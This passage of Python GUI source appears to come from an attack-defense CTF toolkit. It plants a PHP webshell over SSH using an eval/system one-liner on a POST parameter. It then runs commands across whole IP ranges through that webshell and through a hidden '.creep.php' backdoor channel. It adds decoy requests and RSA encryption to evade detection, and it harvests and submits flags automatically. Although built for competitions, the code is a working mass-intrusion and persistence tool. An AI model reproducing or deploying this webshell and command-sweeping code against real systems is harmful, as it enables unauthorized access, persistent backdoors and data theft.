            self.entry_submit.insert(0, cfg.get('submit_url', ''))
            self.entry_token.delete(0, 'end')
            self.entry_token.insert(0, cfg.get('token', ''))
            self.no_submit_var.set(cfg.get('no_submit', False))
            self.entry_interval.delete(0, 'end')
            self.entry_interval.insert(0, str(cfg.get('interval', '30')))
            self.entry_threads.delete(0, 'end')
            self.entry_threads.insert(0, str(cfg.get('threads', '50')))
            self.v_rsa.set(cfg.get('use_rsa', False))
            self.v_mix.set(cfg.get('use_mix', False))
            self.entry_fake.delete(0, 'end')
            self.entry_fake.insert(0, cfg.get('fake_count', '8'))
            self.entry_rsa_agent.delete(0, 'end')
            self.entry_rsa_agent.insert(0, cfg.get('rsa_agent', ''))
            self.v_creep.set(cfg.get('use_creep', True))
            self.entry_creep_pass.delete(0, 'end')
            self.entry_creep_pass.insert(0, cfg.get('creep_pass', 'cmd'))
            self.entry_creep_path.delete(0, 'end')
            self.entry_creep_path.insert(0, cfg.get('creep_path', '/.creep.php'))
            self.v_deep.set(cfg.get('use_deep', False))
        except Exception:
            pass

    def log_self(self, msg, tag='info'):
        if hasattr(self, 'log_w'):
            ts = datetime.now().strftime('%H:%M:%S')
            self.log_w.log(f'[{ts}] {msg}', tag)

    def test_conn(self):
        """测试Webshell和蠕虫通道连接,自动验证配置是否正确"""

        def _test():
            import requests
            base_ip = self.entry_ip.get().strip().split(',')[0].split('/')[0].strip()
            port = self.entry_port.get().strip() or '80'
            proto = 'https' if self.v_https_flag.get() else 'http'
            shell_url = self.entry_shell.get().strip() or '/shell.php'
            shell_pass = self.entry_pass.get().strip() or 'cmd'
            timeout = int(self.entry_timeout.get().strip() or 5)
            cpath = self.entry_creep_path.get().strip() or self.creep_path
            cpass = self.entry_creep_pass.get().strip() or self.creep_pass.get()
            base = f'{proto}://{base_ip}:{port}'
            if not base_ip:
                self.root.after(0, lambda: self.log_self('[!] 请先填写目标IP', 'warn'))
                return
            self.root.after(0, lambda: self.log_self(f'[~] 测试连接 {base} ...', 'info'))
            s = requests.Session()
            try:
                r = s.get(f'{base}{cpath}', timeout=timeout, headers={'X-Creep': cpass, 'X-Cmd': 'id'})
                if r.status_code == 200 and r.text.strip():
                    self.root.after(0, lambda t=r.text.strip()[:60]: self.log_self(f'[OK] 蠕虫通道 ✓  命令输出: {t}', 'ok'))
                else:
                    self.root.after(0, lambda c=r.status_code: self.log_self(f'[X] 蠕虫通道失败 (HTTP {c})', 'error'))
            except Exception as e:
                self.root.after(0, lambda e=e: self.log_self(f'[X] 蠕虫通道错误: {str(e)[:60]}', 'error'))
            try:
                r = s.post(f'{base}{shell_url}', data={shell_pass: 'echo "OK";'}, timeout=timeout)
                if r.status_code == 200 and r.text.strip():
                    self.root.after(0, lambda t=r.text.strip()[:60]: self.log_self(f'[OK] Webshell通道 ✓  响应: {t}', 'ok'))
                else:
                    self.root.after(0, lambda c=r.status_code, b=r.text[:60]: self.log_self(f'[X] Webshell通道失败 (HTTP {c}) {b}', 'error'))
            except Exception as e:
                self.root.after(0, lambda e=e: self.log_self(f'[X] Webshell通道错误: {str(e)[:60]}', 'error'))
        async_run(_test)

    def ssh_deploy_flag(self):
        """SSH一键创建Webshell并自动填入Flag获取配置"""

        def do_deploy(vals):
            host, port, user, pwd = (vals['host'], vals['port'], vals['user'], vals['pwd'])
            sh_pass = vals.get('sh_pass', 'cmd')

            def _deploy():
                try:
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                    sftp = ssh.open_sftp()
                    sftp.open('/var/www/html/shell.php', 'w').write('<?php $c=$_POST["' + sh_pass + '"];if(strpos($c,";")!==false||strpos($c,"echo ")===0||strpos($c,"file_")===0||strpos($c,"base64")!==false){@eval($c);}else{@system($c);}?>')
                    sftp.close()
                    self.root.after(0, lambda: self.log_self('[OK] Webshell已创建', 'ok'))
                    self.root.after(0, lambda: (self.entry_shell.delete(0, tk.END), self.entry_shell.insert(0, '/web/shell.php'), self.entry_pass.delete(0, tk.END), self.entry_pass.insert(0, sh_pass)))
                    ssh.close()
                except Exception as e:
                    self.root.after(0, lambda e=e: self.log_self(f'[FAIL] {e}', 'fail'))
            async_run(_deploy)
        pre = getattr(self, '_prefill_ssh', {}) or {}
        ssh_deploy_dialog(self.parent, '🚀 SSH一键创建Webshell', '创建webshell，自动填入Flag配置', [('SSH地址:', 'host', pre.get('host', ''), ''), ('SSH端口:', 'port', pre.get('port', '22'), ''), ('用户名:', 'user', pre.get('user', 'root'), ''), ('密码:', 'pwd', pre.get('pwd', ''), '*'), ('Shell密码:', 'sh_pass', 'cmd', '')], do_deploy)

    def load_file(self):
        p = filedialog.askopenfilename(title='选择IP列表文件')
        if p:
            try:
                with open(p) as f:
                    ips = [l.strip() for l in f if l.strip() and (not l.startswith('#'))]
                self.entry_ip.delete(0, 'end')
                self.entry_ip.insert(0, ','.join(ips))
            except Exception as e:
                messagebox.showerror('错误', str(e))

    def reset_cmds(self):
        self.cmd_text.delete('1.0', 'end')
        self.cmd_text.insert('1.0', '\n'.join(self.DEFAULT_CMDS))

    def test_submit(self):
        url = self.entry_submit.get().strip()
        if not url:
            messagebox.showwarning('提示', '请先填写提交URL')
            return
        flag = f'test_flag_{int(time.time())}'
        try:
            r = requests.post(url, data={'flag': flag, 'token': self.entry_token.get().strip()}, timeout=10)
            self.log_self(f'测试提交: {flag} -> {r.status_code} {r.text.strip()[:60]}', 'info')
        except Exception as e:
            self.log_self(f'测试提交失败: {e}', 'error')

    def get_targets(self):
        ips = set()
        raw = self.entry_ip.get().strip()
        if raw:
            for item in raw.replace('\n', ',').split(','):
                item = item.strip()
                if not item:
                    continue
                try:
                    for h in ipaddress.ip_network(item, strict=False).hosts():
                        ips.add(str(h))
                except (ValueError, TypeError):
                    ips.add(item)
        self_ip = self.entry_self.get().strip()
        if self_ip:
            ips.discard(self_ip)
        return sorted(ips)

    def submit_flag(self, flag, ip):
        if flag in self.known:
            return False
        if self.no_submit_var.get() or not self.entry_submit.get().strip():
            self.log_self(f'[发现] {ip} -> {flag}', 'flag')
            self.known.add(flag)
            return True
        try:
            r = _session().post(self.entry_submit.get().strip(), data={'flag': flag, 'token': self.entry_token.get().strip() or ''}, timeout=10)
            self.log_self(f'[提交] {flag} -> {r.text.strip()[:60]}', 'submit')
            self.known.add(flag)
            self.total_submitted += 1
            self.lbl_submitted.config(text=f'累计提交: {self.total_submitted}')
            return True
        except Exception as e:
            self.log_self(f'[提交失败] {flag}: {e}', 'error')
            return False

    def check_one(self, ip, cmds, shell_url, shell_pass, port, https, timeout):
        ip = ip.strip()
        base = make_base(ip, port, https)
        s = _session()
        use_rsa = self.v_rsa.get()
        use_mix = self.v_mix.get()
        fake_n = safe_int(self.entry_fake.get().strip(), 8)
        rsa_client = None
        if use_rsa:
            try:
                _try_add_path(os.path.join(BASE, '攻击模块'))
                from rsa_crypto import RSAAgentClient
                agent_url = self.entry_rsa_agent.get().strip() or None
                rsa_client = RSAAgentClient(agent_url)
            except Exception as e:
                self.log_self(f'RSA初始化失败: {e}', 'error')
                return False
        for cmd in cmds:
            if self.stop_flag.is_set():
                return False
            try:
                if use_mix:
                    import random, string
                    for i in range(fake_n):
                        if self.stop_flag.is_set():
                            break
                        fd = {shell_pass: f'echo {random.choice(string.ascii_letters * 8)}'} if i % 2 == 0 else {f'x{random.randint(1, 99)}': str(random.randint(1000, 9999))}
                        try:
                            s.post(f'{base}{shell_url}', data=fd, timeout=max(1, timeout // 2))
                        except Exception:
                            pass
                if use_rsa and rsa_client:
                    payload = rsa_client.encrypt_payload(cmd)
                    r = s.post(f'{base}{shell_url}', data={'d': payload}, timeout=timeout)
                    if r.status_code == 200 and r.text.strip():
                        plain = rsa_client.decrypt_response(r.text.strip())
                        for flag in FLAG_PATTERN.findall(plain):
                            if flag not in self.known:
                                self.submit_flag(flag, ip)
                else:
                    r = s.post(f'{base}{shell_url}', data={shell_pass: cmd}, timeout=timeout)
                    if r.status_code == 200:
                        for flag in FLAG_PATTERN.findall(r.text):
                            if flag not in self.known:
                                self.submit_flag(flag, ip)
            except Exception:
                pass
        return True

    def hunt_loop(self):
        targets = self.get_targets()
        if not targets:
            self.log_self('错误: 没有目标IP', 'error')
            self.running = False
            self.root.after(0, lambda: self.btn_start_flag.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.btn_stop_flag.config(state=tk.DISABLED))
            return
        cmds = [l.strip() for l in self.cmd_text.get('1.0', 'end').strip().split('\n') if l.strip()]

        def gi(e, d):
            return max(1, min(9999, safe_int(self.__dict__[f'entry_{e}'].get().strip(), d)))
        port = gi('port', 80)
        timeout = gi('timeout', 5)
        interval = gi('interval', 30)
        threads = gi('threads', 50)
        self.lbl_targets.config(text=f'目标: {len(targets)}')
        self.log_self(f'目标: {len(targets)} 个IP | 线程: {threads} | 命令: {len(cmds)} 条', 'info')
        round_num = 0
        while not self.stop_flag.is_set():
            round_num += 1
            self.lbl_round.config(text=f'轮次: {round_num}')
            self.log_self(f'--- 第 {round_num} 轮 ---', 'round')
            with ThreadPoolExecutor(max_workers=threads) as ex:
                creep_cfg = {'enabled': bool(self.v_creep.get()), 'path': self.entry_creep_path.get().strip() or self.creep_path, 'pass': self.entry_creep_pass.get().strip() or self.creep_pass.get(), 'deep': bool(self.v_deep.get())}
                fs = {ex.submit(self.check_one_v2, ip, cmds, self.entry_shell.get().strip(), self.entry_pass.get().strip(), port, self.v_https_flag.get(), timeout, creep_cfg): ip for ip in targets}
                for f in as_completed(fs):
                    if self.stop_flag.is_set():
                        break
            if round_num % 5 == 0:
                self.save_known()
            for _ in range(interval):
                if self.stop_flag.wait(1):
                    break
        self.running = False
        self.save_known()
        self.log_self('已停止', 'info')
        self.root.after(0, lambda: self.btn_start_flag.config(state=tk.NORMAL))
        self.root.after(0, lambda: self.btn_stop_flag.config(state=tk.DISABLED))

    def start_hunt(self):
        if self.running:
            return
        if not self.entry_ip.get().strip():
            messagebox.showwarning('提示', '请先输入目标IP')
            return
        self.stop_flag.clear()
        self.running = True
        self.btn_start_flag.config(state=tk.DISABLED)
        self.btn_stop_flag.config(state=tk.NORMAL)
        async_run(self.hunt_loop)

    def stop_hunt(self):
        self.stop_flag.set()
        self.btn_stop_flag.config(state=tk.DISABLED)

    def clear_history(self):
        self._history.clear()
        for i in self.hist_tree.get_children():
            self.hist_tree.delete(i)
        self.lbl_hist_stat.config(text='共 0 条 | 成功 0 | 失败 0')

    def add_history(self, flag, ip, status, detail=''):
        ts = datetime.now().strftime('%H:%M:%S')
        tag = 'ok' if status == 'ok' else 'fail'
        self.hist_tree.insert('', 0, values=(ts, ip, flag, '✅' if status == 'ok' else '❌'), tags=(tag,))
        self._history.append({'time': ts, 'ip': ip, 'flag': flag, 'status': status, 'detail': detail})
        ok = sum((1 for h in self._history if h['status'] == 'ok'))
        fail = len(self._history) - ok
        self.lbl_hist_stat.config(text=f'共 {len(self._history)} 条 | 成功 {ok} | 失败 {fail}')

    def manual_submit(self):
        flag = self.manual_flag.get().strip()
        if not flag:
            messagebox.showwarning('提示', '请输入Flag')
            return
        ip = self.manual_ip.get().strip() or 'manual'

        def log_m(msg, tag='info'):
            self.manual_log.config(state=tk.NORMAL)
            self.manual_log.insert(tk.END, msg + '\n', tag)
            self.manual_log.see(tk.END)
            self.manual_log.config(state=tk.DISABLED)
        submit_url = self.entry_submit.get().strip()
        if not submit_url:
            log_m(f'[SKIP] 未配置提交URL，仅记录', 'info')
            self.add_history(flag, ip, 'ok', 'manual(no-submit)')
            return
        try:
            r = _session().post(submit_url, data={'flag': flag, 'token': self.entry_token.get().strip() or ''}, timeout=10)
            ok = r.status_code == 200
            log_m(f"[{('OK' if ok else 'FAIL')}] {flag} -> {r.status_code}", 'ok' if ok else 'fail')
            self.add_history(flag, ip, 'ok' if ok else 'fail', f'HTTP {r.status_code}')
        except Exception as e:
            log_m(f'[FAIL] {flag}: {e}', 'fail')
            self.add_history(flag, ip, 'fail', str(e)[:40])

    def submit_flag_multi(self, flag, ip):
        """增强版提交: 多URL + 重试队列"""
        if flag in self.known:
            return False
        self.known.add(flag)
        if self.no_submit_var.get():
            self.log_self(f'[发现] {ip} -> {flag}', 'flag')
            self.add_history(flag, ip, 'ok', '仅扫描')
            return True
        urls = self.entry_submit.get().strip().splitlines()
        urls = [u.strip() for u in urls if u.strip()]
        token = self.entry_token.get().strip()
        ok_any = False
        for url in urls:
            for attempt in range(3):
                try:
                    r = _session().post(url, data={'flag': flag, 'token': token or ''}, timeout=10)
                    if r.status_code == 200:
                        self.log_self(f'[提交] {flag} -> {url[:30]}... {r.text.strip()[:30]}', 'submit')
                        self.add_history(flag, ip, 'ok', url[:30])
                        self.total_submitted += 1
                        self.lbl_submitted.config(text=f'累计提交: {self.total_submitted}')
                        ok_any = True
                        break
                    else:
                        self.log_self(f'[重试] {flag} -> {url[:30]}... HTTP {r.status_code} (第{attempt + 1}次)', 'warn')
                except Exception as e:
                    if attempt < 2:
                        self.log_self(f'[重试] {flag} 第{attempt + 1}次: {e}', 'warn')
                        time.sleep(1)
                    else:
                        self.log_self(f'[提交失败] {flag} 重试耗尽: {e}', 'error')
                        self.add_history(flag, ip, 'fail', str(e)[:30])
        return ok_any

    def check_one_v2(self, ip, cmds, shell_url, shell_pass, port, https, timeout, creep_cfg=None):
        """增强版 check_one，使用 submit_flag_multi"""
        ip = ip.strip()
        base = make_base(ip, port, https)
        s = _session()
        creep_cfg = creep_cfg or {'enabled': False, 'path': self.creep_path, 'pass': self.creep_pass.get(), 'deep': False}
        use_rsa = self.v_rsa.get()
        use_mix = self.v_mix.get()
        fake_n = safe_int(self.entry_fake.get().strip(), 8)
        rsa_client = None
        if use_rsa:
            try:
                _try_add_path(os.path.join(BASE, '攻击模块'))
                from rsa_crypto import RSAAgentClient
                agent_url = self.entry_rsa_agent.get().strip() or None
                rsa_client = RSAAgentClient(agent_url)
            except Exception as e:
                self.log_self(f'RSA初始化失败: {e}', 'error')
                return False
        for cmd in cmds:
            if self.stop_flag.is_set():
                return False
            try:
                if use_mix:
                    import random, string
                    for i in range(fake_n):
                        if self.stop_flag.is_set():
                            break
                        fd = {shell_pass: f'echo {random.choice(string.ascii_letters * 8)}'} if i % 2 == 0 else {f'x{random.randint(1, 99)}': str(random.randint(1000, 9999))}
                        try:
                            s.post(f'{base}{shell_url}', data=fd, timeout=max(1, timeout // 2))
                        except Exception:
                            pass
                if use_rsa and rsa_client:
                    payload = rsa_client.encrypt_payload(cmd)
                    r = s.post(f'{base}{shell_url}', data={'d': payload}, timeout=timeout)
                    if r.status_code == 200 and r.text.strip():
                        plain = rsa_client.decrypt_response(r.text.strip())
                        for flag in FLAG_PATTERN.findall(plain):
                            if flag not in self.known:
                                self.submit_flag_multi(flag, ip)
                else:
                    got = False
                    if creep_cfg.get('enabled'):
                        try:
                            rc = s.get(f"{base}{creep_cfg['path']}", timeout=timeout, headers={'X-Creep': creep_cfg['pass'], 'X-Cmd': cmd})
                            self.log_self(f'[蠕虫] {ip} {cmd} -> {rc.status_code} {rc.text.strip()[:40]!r}', 'info')
                            if rc.status_code == 200 and rc.text.strip():
                                txt = rc.text.strip()
                                if txt not in ('NO_IP', 'OK:0', ''):
                                    for flag in FLAG_PATTERN.findall(txt):
                                        if flag not in self.known:
                                            self.submit_flag_multi(flag, ip)
                                    got = True
                        except Exception as e:
                            self.log_self(f'[蠕虫] {ip} {cmd} 错误: {str(e)[:50]}', 'error')
                    if not got:
                        wrapped = 'echo `%s`;' % cmd.replace('`', '\\`')
                        r = s.post(f'{base}{shell_url}', data={shell_pass: wrapped}, timeout=timeout)
                        self.log_self(f'[shell] {ip} {cmd} -> {r.status_code} {r.text.strip()[:40]!r}', 'info')
                        if r.status_code == 200:
                            for flag in FLAG_PATTERN.findall(r.text):
                                if flag not in self.known:
                                    self.submit_flag_multi(flag, ip)
            except Exception as e:
                self.log_self(f'[猎手] {ip} {cmd} 错误: {str(e)[:50]}', 'error')
        if creep_cfg.get('deep'):
            dtimeout = max(timeout * 6, 20)
            for dcmd in self.DEEP_CMDS:
                if self.stop_flag.is_set():
                    return True
                dgot = False
                if creep_cfg.get('enabled'):
                    try:
                        rc = s.get(f"{base}{creep_cfg['path']}", timeout=dtimeout, headers={'X-Creep': creep_cfg['pass'], 'X-Cmd': dcmd})
                        self.log_self(f'[深度] {ip} -> {rc.status_code} {rc.text.strip()[:40]!r}', 'info')
                        if rc.status_code == 200 and rc.text.strip():
                            for flag in FLAG_PATTERN.findall(rc.text):
                                if flag not in self.known:
                                    self.submit_flag_multi(flag, ip)
                            dgot = True
                    except Exception as e:
                        self.log_self(f'[深度] {ip} 错误: {str(e)[:50]}', 'error')
                if not dgot:
                    wrapped = 'echo `%s`;' % dcmd.replace('`', '\\`')
                    try:
                        r = s.post(f'{base}{shell_url}', data={shell_pass: wrapped}, timeout=dtimeout)
                        self.log_self(f'[深度/shell] {ip} -> {r.status_code}', 'info')
                        if r.status_code == 200:
                            for flag in FLAG_PATTERN.findall(r.text):
                                if flag not in self.known:
                                    self.submit_flag_multi(flag, ip)
                    except Exception as e:
                        self.log_self(f'[深度/shell] {ip} 错误: {str(e)[:50]}', 'error')
        return True

    def _domain_init(self, parent, log_func):
        self.parent = parent
        self.log = log_func
        self.running = False
        self.stop_flag = threading.Event()
        self.known = set()
        self.total_submitted = 0
        self.load_known()
        self.cfg_file = os.path.join(EXE_DIR, '攻击模块', 'flag_hunter_config.json')
        self.DEFAULT_CMDS = ['cat /flag', 'cat /flag.txt', 'cat /root/flag', 'env 2>/dev/null | grep -i flag', 'type flag.txt']
        self.DEEP_CMDS = ['find /tmp /dev/shm /app /var/www /var/tmp /home /opt /srv /usr/local /var/backups -type f -iname "*flag*" -exec grep -h -a -o -E \'flag\\{[^}]+\\}|[a-f0-9]{32}\' {} + 2>/dev/null', 'find / \\( -path /proc -o -path /sys -o -path /dev -o -path /run \\) -prune -o -type f -iname "*flag*" -exec grep -h -a -o -E \'flag\\{[^}]+\\}|[a-f0-9]{32}\' {} + 2>/dev/null']
        self.v_creep = StateValue(value=True)
        self.v_deep = StateValue(value=False)
        self.creep_pass = StateValue(value='cmd')
        self.creep_path = '/.creep.php'
        self.load_config()
    _fields = {'running': {'kind': 'literal', 'default': False}, 'stop_flag': {'kind': 'event'}, 'total_submitted': {'kind': 'literal', 'default': 0}, 'DEFAULT_CMDS': {'kind': 'literal', 'default': ['cat /flag', 'cat /flag.txt', 'cat /root/flag', 'env 2>/dev/null | grep -i flag', 'type flag.txt']}, 'DEEP_CMDS': {'kind': 'literal', 'default': ['find /tmp /dev/shm /app /var/www /var/tmp /home /opt /srv /usr/local /var/backups -type f -iname "*flag*" -exec grep -h -a -o -E \'flag\\{[^}]+\\}|[a-f0-9]{32}\' {} + 2>/dev/null', 'find / \\( -path /proc -o -path /sys -o -path /dev -o -path /run \\) -prune -o -type f -iname "*flag*" -exec grep -h -a -o -E \'flag\\{[^}]+\\}|[a-f0-9]{32}\' {} + 2>/dev/null']}, 'v_creep': {'kind': 'value', 'default': True}, 'v_deep': {'kind': 'value', 'default': False}, 'creep_pass': {'kind': 'value', 'default': 'cmd'}, 'creep_path': {'kind': 'literal', 'default': '/.creep.php'}, 'entry_ip': {'kind': 'value', 'default': ''}, 'entry_self': {'kind': 'value', 'default': ''}, 'entry_shell': {'kind': 'value', 'default': '/web/shell.php'}, 'entry_pass': {'kind': 'value', 'default': 'cmd'}, 'entry_port': {'kind': 'value', 'default': '80'}, 'v_https_flag': {'kind': 'value', 'default': ''}, 'entry_timeout': {'kind': 'value', 'default': '5'}, 'cmd_text': {'kind': 'text', 'default': ''}, 'entry_creep_path': {'kind': 'value', 'default': ''}, 'entry_creep_pass': {'kind': 'value', 'default': ''}, 'v_rsa': {'kind': 'value', 'default': ''}, 'v_mix': {'kind': 'value', 'default': ''}, 'entry_fake': {'kind': 'value', 'default': '8'}, 'entry_rsa_agent': {'kind': 'value', 'default': ''}, 'entry_submit': {'kind': 'value', 'default': ''}, 'entry_token': {'kind': 'value', 'default': ''}, 'no_submit_var': {'kind': 'value', 'default': ''}, 'entry_interval': {'kind': 'value', 'default': '30'}, 'entry_threads': {'kind': 'value', 'default': '50'}, 'log_w': {'kind': 'log'}, 'hist_tree': {'kind': 'table'}, '_history': {'kind': 'literal', 'default': []}, 'manual_flag': {'kind': 'value', 'default': ''}, 'manual_ip': {'kind': 'value', 'default': ''}, 'manual_log': {'kind': 'log'}, '_submit_urls': {'kind': 'literal', 'default': []}, '_submit_tokens': {'kind': 'literal', 'default': []}, 'parent': {'kind': 'value', 'default': ''}, 'log': {'kind': 'value', 'default': ''}, 'known': {'kind': 'value', 'default': ''}, 'cfg_file': {'kind': 'value', 'default': ''}, 'btn_start_flag': {'kind': 'value', 'default': ''}, 'btn_stop_flag': {'kind': 'value', 'default': ''}, 'lbl_targets': {'kind': 'value', 'default': ''}, 'lbl_round': {'kind': 'value', 'default': ''}, 'lbl_submitted': {'kind': 'value', 'default': ''}, 'btn_clear_hist': {'kind': 'value', 'default': ''}, 'lbl_hist_stat': {'kind': 'value', 'default': ''}, 'root': {'kind': 'value', 'default': ''}}
NEO = {'new': '#00ff9d', 'mod': '#ffcc00', 'del': '#ff4d6d', 'conn': '#c084fc', 'bg': '#070b14', 'card_bg': '#0d1526', 'card_hi': '#111c33', 'border': '#1b2a4a', 'text': '#d6e4ff', 'text_dim': '#6b7f9e', 'accent': '#00d4ff', 'accent2': '#7c5cff', 'ok': '#00ff9d', 'warn': '#ffcc00'}
MON_CK = {'new': '#00ff9d', 'mod': '#ffcc00', 'del': '#ff4d6d', 'conn': '#c084fc', 'bg': '#070b14', 'card_bg': '#0d1526', 'border': '#1b2a4a', 'text': '#d6e4ff', 'text_dim': '#6b7f9e', 'accent': '#00d4ff'}

def neo_card(parent, padx=1, pady=1, glow='#00d4ff'):
    f = tk.Frame(parent, bg=NEO['border'], bd=0)
    inner = tk.Frame(f, bg=NEO['card_bg'], bd=0, highlightthickness=1, highlightcolor=NEO['border'], highlightbackground=NEO['border'])
    inner.pack(fill=tk.BOTH, expand=True, padx=padx, pady=pady)
    return inner

def neo_btn(parent, text, cmd=None, color='#00d4ff', fg='#04121a', bold=False, padx=10, pady=3, font_size=9, side=None):
    b = tk.Button(parent, text=text, command=cmd, bg=color, fg=fg, relief=tk.FLAT, bd=0, padx=padx, pady=pady, cursor='hand2', font=('微软雅黑', font_size, 'bold' if bold else 'normal'), activebackground=color, activeforeground=fg, highlightthickness=1, highlightcolor=color, highlightbackground=color)

    def _enter(e):
        b.config(bg=NEO['bg'], fg=color, highlightbackground=color, highlightcolor=color)

    def _leave(e):
        b.config(bg=color, fg=fg, highlightbackground=color, highlightcolor=color)
    b.bind('<Enter>', _enter)
    b.bind('<Leave>', _leave)
    if side:
        b.pack(side=side, padx=3, pady=2)
    else:
        b.pack(padx=3, pady=2)
    return b

def neo_title(parent, text, size=12, padx=4, pady=(8, 2)):
    f = tk.Frame(parent, bg=NEO['bg'])
    f.pack(fill=tk.X, padx=padx, pady=pady)
    tk.Label(f, text=text, font=('微软雅黑', size, 'bold'), fg=NEO['accent'], bg=NEO['bg']).pack(side=tk.LEFT)
    bar = tk.Frame(f, bg=NEO['accent'], height=2)
    bar.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(8, 0), pady=(size // 2, 0))
    return f

class MonitorTab(ActorState):

    def deploy_monitor(self):
        """一键部署 target_monitor.php 到靶机"""
        win = tk.Toplevel(self.parent)
        win.title('一键部署监控脚本')
        win.geometry('450x300')
        win.transient(self.parent)
        win.grab_set()
        win.configure(bg=MON_CK['bg'])
        tk.Label(win, text='🚀 一键部署 target_monitor.php', fg=MON_CK['accent'], bg=MON_CK['bg'], font=('微软雅黑', 11, 'bold')).pack(pady=(12, 8))
        tk.Label(win, text='通过 SSH 将监控脚本上传到靶机 Web 目录', fg=MON_CK['text_dim'], bg=MON_CK['bg'], font=('微软雅黑', 9)).pack()
        tk.Label(win, text='⚠️ 部署后用【网页端口】访问(不是SSH端口)，例如: http://IP:8804/target_monitor.php?u=monitor&p=密码', fg='#ff9d5c', bg=MON_CK['bg'], font=('微软雅黑', 8), wraplength=400, justify=tk.LEFT).pack(pady=(4, 0))
        form = tk.Frame(win, bg=MON_CK['bg'])
        form.pack(padx=20, pady=10, fill=tk.X)
        pre = getattr(self, '_prefill_ssh', {}) or {}
        fields = [('SSH地址:', 'ssh_host', pre.get('host', '')), ('SSH端口:', 'ssh_port', pre.get('port', '22')), ('用户名:', 'ssh_user', pre.get('user', 'root')), ('密码:', 'ssh_pass', pre.get('pwd', '')), ('Web目录:', 'web_dir', pre.get('webdir', '/var/www/html'))]
        self._deploy_vars = {}
        for label, key, default in fields:
            row = tk.Frame(form, bg=MON_CK['bg'])
            row.pack(fill=tk.X, pady=2)
            tk.Label(row, text=label, fg=MON_CK['text'], bg=MON_CK['bg'], width=8, anchor=tk.W, font=('微软雅黑', 9)).pack(side=tk.LEFT)
            var = tk.StringVar(value=default)
            self._deploy_vars[key] = var
            show = ''
            tk.Entry(row, textvariable=var, width=30, bg='#111c33', fg=MON_CK['text'], insertbackground=MON_CK['text'], relief=tk.FLAT, font=('Consolas', 9), show='').pack(side=tk.LEFT, padx=4)

        def do_deploy():
            host = self._deploy_vars['ssh_host'].get().strip()
            port = self._deploy_vars['ssh_port'].get().strip()
            user = self._deploy_vars['ssh_user'].get().strip()
            pwd = self._deploy_vars['ssh_pass'].get().strip()
            web_dir = self._deploy_vars['web_dir'].get().strip()
            if not host or not pwd:
                messagebox.showerror('错误', '请填写SSH地址和密码')
                return
            candidates = [os.path.join(BASE, '上传靶机', 'target_monitor.php'), os.path.join(BASE, 'target_monitor.php'), os.path.join(os.path.dirname(sys.executable), '上传靶机', 'target_monitor.php'), os.path.join(os.path.dirname(sys.executable), 'target_monitor.php')]
            php_path = None
            for p in candidates:
                if os.path.exists(p):
                    php_path = p
                    break
            if not php_path:
                msg = f'找不到 target_monitor.php\n尝试过的路径:\n' + '\n'.join(candidates)
                messagebox.showerror('错误', msg)
                return
            self.status_label.config(text='🚀 正在部署...')
            win.destroy()
            mon_pw = self.password.get().strip()

            def _deploy():
                try:
                    import paramiko
                    with open(php_path, 'r', encoding='utf-8') as f:
                        php_content = f.read()
                    php_content = php_content.replace('y|lladmin121.@ss', mon_pw)
                    php_content = php_content.replace("$P='1ffd501f923a54275c3137b6aa362627'", "$P='" + mon_pw + "'")
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=int(port), username=user, password=pwd, timeout=10)
                    sftp = ssh.open_sftp()
                    remote = f'{web_dir}/target_monitor.php'
                    with sftp.open(remote, 'w') as f:
                        f.write(php_content)
                    sftp.close()
                    ssh.close()
                    self.root.after(0, lambda: self.status_label.config(text='✅ 部署成功！点击"开始"监控'))
                    self.root.after(0, lambda: messagebox.showinfo('成功', f'已部署到 {remote}'))
                except Exception as e:
                    self.root.after(0, lambda e=e: self.status_label.config(text=f'❌ 部署失败: {e}'))
                    self.root.after(0, lambda e=e: messagebox.showerror('部署失败', str(e)))
            async_run(_deploy)
        tk.Button(form, text='🚀 开始部署', command=do_deploy, bg='#00ff9d', fg='#04121a', relief=tk.FLAT, bd=0, padx=20, pady=6, cursor='hand2', font=('微软雅黑', 10, 'bold'), activebackground='#00ff9d').pack(pady=10)

    def load_config(self):
        ConfigManager._ensure()
        if 'monitor' in ConfigManager._data:
            cfg = ConfigManager.get_section('monitor')
        else:
            cfg = {}
            if os.path.exists(self.cfg_file):
                try:
                    with open(self.cfg_file, encoding='utf-8-sig') as stream:
                        cfg = json.load(stream)
                    if not isinstance(cfg, dict):
                        raise ValueError('监控配置应为对象')
                except (OSError, ValueError) as exc:
                    _warn_config(str(exc))
                    cfg = {}
        if isinstance(cfg.get('url'), str):
            self.target_url.set(cfg['url'])
        if isinstance(cfg.get('password'), str):
            self.password.set(cfg['password'])

    def save_config(self):
        ConfigManager.set_section('monitor', {'url': self.target_url.get(), 'password': self.password.get()})
        ConfigManager.save()
        try:
            atomic_write(self.cfg_file, json.dumps({'url': self.target_url.get(), 'password': self.password.get()}, ensure_ascii=False, indent=2))
        except Exception:
            pass

    def toggle(self):
        if self.monitoring:
            self.monitoring = False
            self._monitor_stop.set()
            self.btn_start_mon.config(text='▶ 开始')
            self.status_label.config(text='已停止')
            return
        base = self.target_url.get().strip()
        if not base:
            messagebox.showerror('错误', '请填写 URL')
            return
        if not base.startswith(('http://', 'https://')):
            base = 'http://' + base
        self.target_url.set(base)
        settings = (base, self.password.get())
        self._monitor_stop = stopper = threading.Event()
        self.monitoring = True
        self.last_json_hash = ''
        self.btn_start_mon.config(text='⏹ 停止')
        self.status_label.config(text='监控中')
        async_run(lambda: self.loop(settings, stopper))

    def _monitor_after(self, stopper, delay, function, *args):
        self.root.after(delay, lambda: function(*args) if not stopper.is_set() else None)

    def loop(self, settings, stopper):
        ctx = ssl.create_default_context()
        base, pw = settings
        while not stopper.is_set():
            try:
                url = f'{base}?u=monitor&p={urllib.parse.quote(pw)}&ajax=1&_={int(time.time() * 1000)}'
                with urllib.request.urlopen(urllib.request.Request(url), timeout=10, context=ctx) as resp:
                    d = json.loads(resp.read().decode('utf-8'))
                if stopper.is_set():
                    break
                self._last_success = time.monotonic()
                if 'lines' in d:
                    h = json.dumps(d['lines'], sort_keys=True)
                    if h != self.last_json_hash:
                        self.last_json_hash = h
                        self._monitor_after(stopper, 0, self.add_lines, list(d['lines']))
                if 'atk' in d:
                    self._monitor_after(stopper, 0, self._update_atk_server, list(d['atk']))
                if 'sys' in d and d['sys']:
